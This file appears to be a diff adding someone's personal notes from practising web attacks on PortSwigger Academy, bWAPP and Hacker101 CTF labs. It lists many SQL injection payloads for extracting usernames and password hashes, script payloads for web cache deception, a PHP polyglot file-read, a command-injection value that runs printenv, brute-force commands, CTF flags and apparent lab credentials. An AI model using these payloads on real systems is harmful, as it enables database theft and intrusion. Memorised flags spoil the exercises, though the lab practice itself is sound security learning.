@@ -1,0 +1,393 @@
+k-*fBq9nFxWw}|.6a85R8!65\TC53jms
+
+
+project:
+
+administrator
+gsrfmtmnlbyu8v2hnbak
+
+administrator
+er0nbn5n127e7v66bqca
+
+
+MICROSOFT/MYSQL version check:
+
+' UNION SELECT @@version-- (If you have 1 col)
+
+' UNION SELECT NULL,@@version-- (If you have 2 col) 
+and second col is str data type
+
+similar wway you find ver of the other data bases just change 
+version command 
+
+finding the number of cols is the same for oracle.
+
+find what col is str type on oracle:
+
+' UNION SELECT 'a','a' from DUAL--
+
+when you find what col is str use this to get ver:
+
+' UNION SELECT banner,NULL from v$version--
+' UNION SELECT NULL,banner from v$version--
+
+or this if the upper dosent work:
+
+' UNION SELECT version,NULL from v$instance--
+' UNION SELECT NULL,version from v$instance--
+
+' order by 3#
+' UNION SELECT 'a',NULL#
+' UNION SELECT NULL,'a'#
+
+' UNION SELECT @@version,@@version#
+
+' order by 1--
+
+' UNION SELECT 'a',NULL--
+' UNION SELECT NULL,'a'--
+' UNION SELECT 'a','a'--
+' UNION SELECT @@version,NULL--
+' UNION SELECT version(),NULL--
+
+ ' UNION SELECT table_name,NULL FROM
+ ' UNION SELECT table_name,NULL FROM information_schema.tables--
+
+ ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_ykuwmw'--
+
+  ' UNION SELECT tusername_zzcssi,password_byaqon FROM users_ykuwmw--
+
+  ' UNION SELECT table_name,NULL FROM all_tables--
+
+  ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'USERS_TSNEYT'--
+  ' UNION SELECT USERNAME_ODTOUA,PASSWORD_AADQJG from USERS_TSNEYT--
+
+  <storeId>1'--</storeId>
+
+  docker run --rm -p 3000:3000 bkimminich/juice-shop
+
+  ../../v1/users/administrator/field/passwordResetToken%23
+
+
+  //bwapp
+
+  docker pull hackersploit/bwapp-docker
+  docker run -d -p 80:80 hackersploit/bwapp-docker
+  http://127.0.0.1/install.php⁠
+
+  ' OR 1=1 #
+  ' UNION SELECT 'A','ABC','ABC','ABC','ABC','A','A' #
+
+  ' UNION SELECT 'A','ABC',column_name,'ABC','ABC','A','A' FROM information_schema.columns WHERE table_name='users' #
+  
+
+  users table exists
+
+  the columns in users table:  id,login,password,email,secret,activation_code,activated,reset_code,admin
+
+  ' UNION SELECT 'A',login,password,secret,'A','A','A' FROM users #
+
+  SELECT movie from 
+
+  AND 1=1
+
+  time based sqli:
+
+  1 AND SLEEP(5)
+  1 AND (SELECT SLEEP(5))
+  1 AND (SELECT IF(@@version LIKE '%5%', SLEEP(5), 0))
+  1 AND (SELECT IF(@@version LIKE '%mysql%', SLEEP(5), 0)) 
+  1 AND (SELECT SLEEP(5) FROM information_schema.tables WHERE table_name='users')
+  1 AND (SELECT SLEEP(5) FROM information_schema.columns WHERE table_name='users' AND column_name='password')
+  1 AND (SELECT SLEEP(5) FROM information_schema.columns WHERE table_name='users' AND column_name='username')
+  table users exists
+  columns password,login exists
+
+  1 AND (SELECT IF(1=1, SLEEP(5), 0))
+  1 AND IF((SELECT COUNT(*) FROM users WHERE login='test') > 0 , SLEEP(5), 0)  //find out if user test exists
+  1 AND IF((SELECT COUNT(login) FROM users) > 1 , SLEEP(5), 0)  //find out if column named login is in length bigger than 1 (there are 2 users)
+  1 AND IF(LENGTH((SELECT login FROM users LIMIT 0,1)) > 5, SLEEP(5), 0)  //find out if the first user in the login column is in length bigger than 5 (first user length is 6)
+  1 AND IF(LENGTH((SELECT login FROM users LIMIT 1,1)) > 5, SLEEP(5), 0)  //find out if the second user in the login column is in length bigger than 5 (second user length is 3)
+  1 AND IF(SUBSTRING((SELECT login FROM users LIMIT 0,1), 1, 1)= 'a', SLEEP(5), 0) //find out if the first user login starts with 'a'
+
+  1 AND IF(LENGTH((SELECT password FROM users LIMIT 0,1)) > 5, SLEEP(5), 0) (passwords length is 40 its SHA-1 hashing)
+  1 AND IF(SUBSTRING((SELECT password FROM users LIMIT 0,1), 1, 1)= 'a', SLEEP(5), 0)
+
+  1+AND+IF(SUBSTRING((SELECT+password+FROM+users+LIMIT+0,1),+1,+1)%3d+'a',+SLEEP(5),+0)
+
+
+  a96586f3885a4a131269f42c99b33b3cd5536c42
+
+   <script>document.location="https://0a4e0023042c0d2d82532ed5003900f2.web-security-academy.net/my-account/wcd.js"</script>
+   https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js
+  
+
+
+
+  list of delimiters: 
+
+  !
+"
+#
+$
+%
+&
+'
+(
+)
+*
++
+,
+-
+.
+/
+:
+;
+<
+=
+>
+?
+@
+[
+\
+]
+^
+_
+`
+{
+|
+}
+~
+%21
+%22
+%23
+%24
+%25
+%26
+%27
+%28
+%29
+%2A
+%2B
+%2C
+%2D
+%2E
+%2F
+%3A
+%3B
+%3C
+%3D
+%3E
+%3F
+%40
+%5B
+%5C
+%5D
+%5E
+%5F
+%60
+%7B
+%7C
+%7D
+%7E
+%00
+%09
+%0A
+
+
+
+https://0a1800c20441cc0881156b7e00f50040.web-security-academy.net/my-account;hhh.js
+
+<script>document.location="https://0a1800c20441cc0881156b7e00f50040.web-security-academy.net/my-account;hhh.js"</script>
+
+/assets/..%2fmy-account?cc.js
+
+<script>document.location="https://0a26001c04b813d2805c8f4d006800c4.web-security-academy.net/resources/..%2fmy-account?qq.js"</script>
+
+
+the delimiter that is seen by the origin server is #
+
+/my-account#ww.js%2f%2e%2e%2fresources
+
+<script>document.location="https://0a1000020402b1c980e0038100980067.web-security-academy.net/my-account%23ww.js%2f%2e%2e%2fresources"</script>
+
+https://0a5b0020038783488003b2130024005a.web-security-academy.net/files/avatars/file2.php?command=..
+
+
+
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+  
+
+
+
+^FLAG^4a29a3abf822bbaabfb14ced324d2e6f7bb7a3b061c25e6077ac2b1f45dc9ba5$FLAG$
+^FLAG^f7d19b7222ead4681ca1759cb21f252f9bb6f767c2efea2c262a428e8e2959bc$FLAG$
+^FLAG^9b473d54cb70dde6aff3cc41dda5a5adcd9fd836b3ff49b08300010e92299ed7$FLAG$
+
+^FLAG^a02a9b6b4e38e726fe0c9daf6e4d5146824d7faa13624d78f72ce1e1b896d959$FLAG$
+^FLAG^3e512eb35bac6bdcd520320805b6298a4392a7c0d96d2994227f14a49fb72890$FLAG$
+^FLAG^09fcee342253c6a0be7f80c4aa34089af7b60e15e016da6d166236a0275107be$FLAG$ 
+^FLAG^cdfc6b80c4a5fdf9443e626cd3096e22c9f36c8a47cba75e19072eec4bee3f4a$FLAG$
+
+/L
+
+	^FLAG^ec2719d903112567493c33a09309cce31f31d7d95de72ca8b75e5fc3abb4789c$FLAG$
+  
+
+  gobuster dir -u https://8b114323b3f34763f65dba0f2aa0941b.ctf.hacker101.com/ -w /usr/share/wordlists/dirb/common.txt -t 10 
+
+  /usr/share/seclists/Usernames/Names/names.txt
+  concetta
+
+
+  ethyl
+  jackie
+
+  /usr/share/seclists/Passwords/Common-Credentials
+  /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
+  /usr/share/seclists/Usernames/Names/names.txt
+
+  ^FLAG^30eab68d5ba81e77501428b3fbba0e378821d27b93ba5e2aa465c204958ef271$FLAG$
+
+
+
+  gobuster dir -u https://c5715ce4aa71d008261d5511b64fd41b.ctf.hacker101.com/ -w /usr/share/wordlists/dirb/common.txt -t 20
+
+
+
+###############################
+
+  BLIND sql injection (MYSQL DB)
+  2 or 1=2 -- works
+
+  2 AND SLEEP(5) -- Works so its a blind time sql injection that works on mysql DB
+
+sqlmap -r /home/kali/Desktop/ctf/hacker101/request6.txt -p id --dbms=mysql --technique=T --delay=0.5 --threads=1 --time-sec=3 --batch
+
+/home/kali/Desktop/ctf/hacker101/request4.txt
+
+BLIND sql injection (MYSQL DB)
+  2 or 1=2 -- works
+
+  2 AND SLEEP(5) -- Works so its a blind time sql injection that works on mysql DB
+
+  2 OR IF((1=1), SLEEP(5), 0);  If True there is delay
+  2 OR IF((2=1), SLEEP(5), 0);  if False there is no delay
+
+  //check the length of db name
+  
+  2 OR IF (LENGTH(DATABASE()) > 1, SLEEP(5), 0);
+  LENGTH(DATABASE()) > 1                                   //// The length is 6 
+
+  //check if the first letter is 'a'
+
+  2 OR IF(SUBSTRING(DATABASE(),1,1)='a', SLEEP(5), 0);
+
+  //check if the SECOND letter is 'a'
+
+  2 OR IF(SUBSTRING(DATABASE(),2,1)='a', SLEEP(5), 0);     /// db name is level5
+
+  //check if the number of tables inside the db is bigger than 1
+
+  2 OR IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE()) > 1, SLEEP(5), 0);             ///there are 2 tables
+
+  //check the length of spesific table(the first here)
+
+  2 OR IF(LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1)) > 1, SLEEP(5), 0);                //works
+
+
+      ///the table name are albums and photos///
+
+      next is to find the number of cols in each table, there name length, and finally there name
+
+  2 OR IF((SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='PHOTOS') > 1, SLEEP(5), 0); 
+
+  flag:
+  d26b5f5fa3139d64cfb41d5577df77690921c8575710aeb394a3b8a99cdde2e1
+
+  ^FLAG^d26b5f5fa3139d64cfb41d5577df77690921c8575710aeb394a3b8a99cdde2e1$FLAG$
+  files/purrfect.jpg
+
+  2 UNION SELECT uwsgi.ini
+
+
+Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + '
+
+fetch?id=3; UPDATE photos SET filename=";echo $(printenv)" WHERE id=3; commit;
+
+
+^FLAG^7bbf17f369f9958fcb7d85a3162b9d71db0b1e50c8827f05665a6cc5698393b1$FLAG$
+^FLAG^d26b5f5fa3139d64cfb41d5577df77690921c8575710aeb394a3b8a99cdde2e1$FLAG$
+^FLAG^00440abd5a40bc52d2e12bdf0246127ad9f086e8ab048c6211ba53717830a8b8$FLAG$
+
+gobuster dir -u https://48cb4b0f2a5a4db847fed4deac50ee3b.ctf.hacker101.com/ -w /usr/share/wordlists/dirb/common.txt -t 20      
+
+/assets               (Status: 301) [Size: 178] [--> 
+/favicon.ico          (Status: 200) [Size: 5430]
+/forum                (Status: 302) [Size: 0] [--> forum/]
+/robots.txt           (Status: 200) [Size: 120]
+
+clues found on /robots.txt:
+User-agent: *
+Disallow: /s3cr3t-ar3a
+
+ther are 2 users on the forum:
+grinch    	
+Christmas christmas
+max
+
+i will try to brute force the password wwith rockyou
+
+flags:
+^FLAG^e547ec7e989f959d512fadbd2e32d31985aaeb9fed1cae0a8ca1a4a02fa20201$FLAG$ USED
+
+^FLAG^b9541a6e79182f3b44b82f377e3d3f6ef3bd8a2769c71b7262a5286c02a12299$FLAG$
+
+/apps-home/
+
+access
+computer
+
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt /Desktop/ctf/hacker101/zip file/my_secure_files_not_for_you.zip
+
+zip password: hahahaha
+
+/sessions             (Status: 302) [Size: 0] [--> ../../swag-shop/api/sessions/]
+/stock                (Status: 302) [Size: 0] [--> ../../swag-shop/api/stock/]
+/user                 (Status: 302) [Size: 0] [--> ../../swag-shop/api/user/]
+
+
+the flag:^FLAG^a988c60f9f904048e2d1696066f7a364cfdc9b146bcc1c29852b2bedd34481b5$FLAG$
+another: ^FLAG^60b65711728a6d67eed01438d8ee46186235aa4f00506562d9fb153b24e78799$FLAG$
+
+burp-parameter-names.txt
+/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
+C7DCCE-0E0DAB-B20226-FC92EA-1B9043
+
+^FLAG^3de1ec92e3db965daaeafe50ef3ee4c210d35307b98272f2c149a147979014f3$FLAG$
+
+aGkgaSBsaWtlIHlvdXIgd2ViIHNpdGUK
+
+
+
+
+
+
+
+
+
+       
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
